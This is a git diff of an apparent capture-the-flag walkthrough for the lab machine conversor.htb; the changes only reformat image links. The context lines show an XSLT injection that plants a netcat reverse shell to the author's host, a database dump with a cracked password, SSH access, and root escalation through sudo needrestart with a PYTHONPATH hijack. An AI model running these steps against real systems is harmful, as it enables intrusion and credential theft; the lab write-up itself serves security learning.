@@ -21,13 +21,13 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-![[Pasted image 20251211132929.png]]
+![Pasted image 20251211132929](../Attachments/Pasted%20image%2020251211132929.png)
 - I registered as `test:test` and logged in
-![[Pasted image 20251211133027.png]]
+![Pasted image 20251211133027](../Attachments/Pasted%20image%2020251211133027.png)
 - Can upload XML and XSLT files. 
 https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#read-files-and-ssrf-using-document
 - In the About page I can grab the source code and extract with `tar -xzvf` command and I find there is a users.db but nothing in it. its an sqlite3 file:
-![[Pasted image 20251211190536.png]]
+![Pasted image 20251211190536](../Attachments/Pasted%20image%2020251211190536.png)
 
 ```
 tar -xvf source_code.tar.gz
@@ -37,11 +37,11 @@ tar -xvf source_code.tar.gz
 cd instance
 sqlite3 users.db.dump
 ```
-![[Pasted image 20251211185955.png]]
+![Pasted image 20251211185955](../Attachments/Pasted%20image%2020251211185955.png)
 
 -----
 - Looking online I find an example xslt exploit 
-![[Pasted image 20251211185521.png]]
+![Pasted image 20251211185521](../Attachments/Pasted%20image%2020251211185521.png)
 - I can use this to make xml view it as an executable and save it to the location I wish. I create an example script (with GPT):
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -61,18 +61,18 @@ os.system("busybox nc 10.10.14.21 9998 -e /bin/bash")
 </xsl:stylesheet>
 ```
 - I also create a simple conveyor.xml file and upload both while having my netcat listener waiting:
-![[Pasted image 20251211185747.png]]
+![Pasted image 20251211185747](../Attachments/Pasted%20image%2020251211185747.png)
 
 - I grab a shell on my listener as `www-data`
-![[Pasted image 20251211190842.png]]
+![Pasted image 20251211190842](../Attachments/Pasted%20image%2020251211190842.png)
 - I check /etc/passwd for other users:
 ```
 cat /etc/passwd | grep -i "/bin/bash"
 ```
-![[Pasted image 20251211190419.png]]
+![Pasted image 20251211190419](../Attachments/Pasted%20image%2020251211190419.png)
 
 - I check the users.db (based on the source code file we found earlier) file and dump the output to find an MD5 hash of user `fismathack`:
-![[Pasted image 20251211191013.png]]
+![Pasted image 20251211191013](../Attachments/Pasted%20image%2020251211191013.png)
 ```
 sqlite3 users.db .dump
 
@@ -107,13 +107,13 @@ INSERT INTO sqlite_sequence VALUES('users',5);
 COMMIT;
 ```
 - I crack the hash with crackstation.net : `Keepmesafeandwarm`
-![[Pasted image 20251211191126.png]]
+![Pasted image 20251211191126](../Attachments/Pasted%20image%2020251211191126.png)
 
 - I can ssh into the target as user `fismat:Keepmesafeandwarm`
 ```
 ssh fismathack@10.10.11.92
 ```
-![[Pasted image 20251211191310.png]]
+![Pasted image 20251211191310](../Attachments/Pasted%20image%2020251211191310.png)
 - checking sudo privileged commands I find needstart:
 ```
 sudo -l
@@ -126,7 +126,7 @@ Matching Defaults entries for fismathack on conversor:
 User fismathack may run the following commands on conversor:
     (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
 ```
-![[Pasted image 20251211191335.png]]
+![Pasted image 20251211191335](../Attachments/Pasted%20image%2020251211191335.png)
 - I check the help command and find the argument to find the version:
 ```
 sudo /usr/bin/needtsart --help
@@ -252,14 +252,14 @@ cd /tmp/malicious
 export PYTHONPATH="$PWD"
 python3 e.py 2>/dev/null
 ```
-![[Pasted image 20251211194351.png]]
+![Pasted image 20251211194351](../Attachments/Pasted%20image%2020251211194351.png)
 
 - On the second terminal I trigger the exploit by passing the needrestart command with sudo privileges:
 ```
 sudo /usr/sbin/needrestart
 ```
-![[Pasted image 20251211194304.png]]
+![Pasted image 20251211194304](../Attachments/Pasted%20image%2020251211194304.png)
 - I escalate to root in the first terminal:
-![[Pasted image 20251211194326.png]]
+![Pasted image 20251211194326](../Attachments/Pasted%20image%2020251211194326.png)
 - I grab root flag:
-![[Pasted image 20251211194427.png]]
+![Pasted image 20251211194427](../Attachments/Pasted%20image%2020251211194427.png)
